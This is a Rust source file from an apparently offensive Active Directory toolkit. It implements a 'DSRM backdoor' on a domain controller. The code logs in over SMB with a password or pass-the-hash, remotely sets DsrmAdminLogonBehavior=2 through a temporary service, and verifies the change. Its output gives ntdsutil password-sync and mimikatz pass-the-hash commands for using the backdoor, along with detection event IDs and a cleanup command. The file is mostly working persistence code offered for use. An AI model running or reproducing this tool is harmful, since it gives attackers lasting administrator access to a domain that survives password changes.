//! DSRM (Directory Services Restore Mode) backdoor.
//!
//! Sets `DsrmAdminLogonBehavior=2` on the DC's registry via a remote
//! service, allowing the local DSRM Administrator account to authenticate
//! over the network — providing persistent admin access even if all domain
//! passwords are changed.
//!
//! # Execution Flow
//!
//! 1. Connect to DC via SMB using credentials from `ForgeConfig`
//! 2. Verify admin access (ADMIN$ / C$)
//! 3. Execute `reg add "HKLM\...\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f`
//!    via a temporary SVCCTL service
//! 4. Optionally sync DSRM password to a known domain account via `ntdsutil`
//! 5. Return results with cleanup instructions
//!
//! # DsrmAdminLogonBehavior values
//!
//! | Value | Meaning |
//! |-------|---------|
//! | 0     | Default – DSRM admin can only log on in DSRM boot mode |
//! | 1     | DSRM admin can log on if AD DS service is stopped |
//! | 2     | **BACKDOOR** – DSRM admin can ALWAYS log on over the network |

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use tracing::{info, warn};

use crate::exec_util;
use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Registry path for DSRM admin logon behavior
const DSRM_REG_PATH: &str = r"HKLM\System\CurrentControlSet\Control\Lsa";
const DSRM_REG_VALUE: &str = "DsrmAdminLogonBehavior";

/// Enable DSRM backdoor on the target DC.
///
/// Connects via SMB, verifies admin access, then executes the `reg add` command
/// remotely via SVCCTL to set `DsrmAdminLogonBehavior=2`.
pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[dsrm] Enabling DSRM backdoor on {}", config.dc_ip);

    // ── Validate credentials ────────────────────────────────────
    let (use_password, password_or_hash) = match (&config.password, &config.nt_hash) {
        (Some(pw), _) => (true, pw.clone()),
        (None, Some(hash)) => (false, hash.clone()),
        _ => {
            return Err(OverthroneError::TicketForge(
                "Credentials required for DSRM backdoor".into(),
            ));
        }
    };

    // ── Step 1: Connect to DC via SMB ───────────────────────────
    info!("[dsrm] Connecting to {} via SMB", config.dc_ip);
    let smb = if use_password {
        SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
            .await
            .map_err(|e| {
                OverthroneError::TicketForge(format!(
                    "SMB connect to {} failed: {e}",
                    config.dc_ip
                ))
            })?
    } else {
        info!("[dsrm] Using pass-the-hash authentication");
        SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
            .await
            .map_err(|e| {
                OverthroneError::TicketForge(format!(
                    "SMB PTH connect to {} failed: {e}",
                    config.dc_ip
                ))
            })?
    };

    // ── Step 2: Verify admin access ─────────────────────────────
    info!("[dsrm] Verifying admin access on {}", config.dc_ip);
    let admin_check = smb.check_admin_access().await;
    if !admin_check.has_admin {
        return Err(OverthroneError::TicketForge(format!(
            "No admin access on {} (shares: {:?}). DA/local admin required.",
            config.dc_ip, admin_check.accessible_shares
        )));
    }
    info!(
        "[dsrm] Admin access confirmed ({:?})",
        admin_check.accessible_shares
    );

    // ── Step 3: Set DsrmAdminLogonBehavior = 2 ──────────────────
    let reg_command = format!(
        "reg add \"{}\" /v {} /t REG_DWORD /d 2 /f",
        DSRM_REG_PATH, DSRM_REG_VALUE
    );
    info!("[dsrm] Executing: {}", reg_command);

    let reg_output = exec_util::run_remote_command(&smb, &reg_command)
        .await
        .map_err(|e| {
            OverthroneError::TicketForge(format!(
                "Failed to execute reg command on {}: {e}",
                config.dc_ip
            ))
        })?;

    // Check output — successful reg add prints "The operation completed successfully."
    let reg_success = reg_output.contains("successfully")
        || reg_output.contains("Successfully")
        || reg_output.trim().is_empty(); // empty output is also ok for reg add

    if !reg_success {
        warn!(
            "[dsrm] reg add output does not indicate success: {}",
            reg_output.trim()
        );
    } else {
        info!("[dsrm] Registry value set successfully");
    }

    // ── Step 4: Verify the value was set ────────────────────────
    let verify_cmd = format!(
        "reg query \"{}\" /v {}",
        DSRM_REG_PATH, DSRM_REG_VALUE
    );
    info!("[dsrm] Verifying: {}", verify_cmd);

    let verify_output = exec_util::run_remote_command(&smb, &verify_cmd)
        .await
        .unwrap_or_else(|e| {
            warn!("[dsrm] Verification query failed: {e}");
            String::new()
        });

    let verified = verify_output.contains("0x2") || verify_output.contains("REG_DWORD");
    if verified {
        info!("[dsrm] Verified: DsrmAdminLogonBehavior = 2");
    } else {
        warn!(
            "[dsrm] Could not verify registry value. Output: {}",
            verify_output.trim()
        );
    }

    // ── Step 5: (Optional) Sync DSRM password ──────────────────
    // ntdsutil "set dsrm password" "sync from domain account Administrator" q q
    // This step is informational — executing ntdsutil interactively over svcctl
    // is unreliable. Users should run it manually or via WinRM.
    let sync_note = format!(
        "To sync DSRM password to a known account, run on DC:\n\
         ntdsutil \"set dsrm password\" \"sync from domain account {}\" q q",
        config.username
    );

    // ── Build result ────────────────────────────────────────────
    let cleanup_cmd = format!(
        "# Remove DSRM backdoor:\n\
         reg delete \"{}\" /v {} /f",
        DSRM_REG_PATH, DSRM_REG_VALUE
    );

    let details = format!(
        "DSRM Backdoor enabled on {}:\n\
         - Registry: {}\\{} = 2 (REG_DWORD)\n\
         - Verified: {}\n\
         - reg add output: {}\n\
         - verify output: {}\n\n\
         {}\n\n\
         Usage:\n\
         - Authenticate as local Administrator with DSRM password\n\
         - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:<DSRM_HASH>\n\n\
         Detection:\n\
         - Event ID 4657 on registry key {}\n\
         - Event ID 4624 LogonType=3 from local (non-domain) account",
        config.dc_ip,
        DSRM_REG_PATH,
        DSRM_REG_VALUE,
        if verified { "YES" } else { "UNCONFIRMED" },
        reg_output.trim(),
        verify_output.trim(),
        sync_note,
        config.dc_ip.split('.').next().unwrap_or(&config.dc_ip),
        DSRM_REG_PATH,
    );

    let success = reg_success;
    Ok(ForgeResult {
        action: "DSRM Backdoor".into(),
        domain: config.domain.clone(),
        success,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "DSRM Administrator Network Logon".into(),
            target: config.dc_ip.clone(),
            success,
            details,
            cleanup_command: Some(cleanup_cmd),
        }),
        message: if success {
            format!(
                "DSRM backdoor enabled on {} — DsrmAdminLogonBehavior=2",
                config.dc_ip
            )
        } else {
            format!(
                "DSRM backdoor may have failed on {} — check output",
                config.dc_ip
            )
        },
    })
}
